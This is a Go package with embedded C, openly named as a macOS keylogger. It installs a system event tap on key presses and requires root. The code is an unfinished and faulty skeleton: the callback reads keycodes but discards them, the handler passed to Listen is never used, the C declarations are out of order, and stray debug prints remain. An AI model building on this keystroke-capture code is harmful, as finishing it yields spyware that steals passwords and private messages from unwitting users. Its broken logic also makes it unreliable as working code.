package keylogger

/*
#cgo LDFLAGS: -framework Foundation -framework Foundation -framework Carbon
#include "keylogger.h"

typedef enum State { Up, Down, Invalid } State;

void listen() {
	printf("creat tap\n");

	CGEventMask eventMask = {
		CGEventMaskBit(kCGEventKeyDown) |
        CGEventMaskBit(kCGEventKeyUp)
	};

	CFMachPortRef eventTap = CGEventTapCreate(
		kCGSessionEventTap, kCGHeadInsertEventTap, 0, eventMask, CGEventCallback, NULL
	);

	printf("create eventtap\n");

    // Exit the program if unable to create the event tap.
    if(!eventTap) {
        fprintf(stderr, "ERROR: Unable to create event tap.\n");
        exit(1);
    }

	printf("create eventtap success\n");

    // Create a run loop source and add enable the event tap.
    CFRunLoopSourceRef runLoopSource = CFMachPortCreateRunLoopSource(kCFAllocatorDefault, eventTap, 0);
    CFRunLoopAddSource(CFRunLoopGetCurrent(), runLoopSource, kCFRunLoopCommonModes);
    CGEventTapEnable(eventTap, true);

    CFRunLoopRun();
}

// The following callback method is invoked on every keypress.
static inline CGEventRef CGEventCallback(CGEventTapProxy proxy, CGEventType type, CGEventRef event, void *refcon) {
	printf("helol\n");
    if (type != kCGEventKeyDown && type != kCGEventFlagsChanged && type != kCGEventKeyUp) { return event; }

    // Retrieve the incoming keycode.
    CGKeyCode keyCode = (CGKeyCode) CGEventGetIntegerValueField(event, kCGKeyboardEventKeycode);

	State s;
	if (type == kCGEventKeyDown) s = Down;
	if (type == kCGEventKeyUp) s = Up;
	if (type == kCGEventFlagsChanged) s = Invalid;
	return event;
}
*/
import "C"

import (
	"errors"
	"os/user"
)

type ListenFunc func(keyCode C.int, stateCode C.State)

type KeyLogger struct {
}

func New() (*KeyLogger, error) {
	u, err := user.Current()
	if err != nil {
		return nil, err
	}

	if u.Uid != "0" {
		return nil, errors.New("capturing key logs requires to run the script with root user")
	}

	return &KeyLogger{}, nil
}

func (k *KeyLogger) Listen(f ListenFunc) {
	C.listen()
}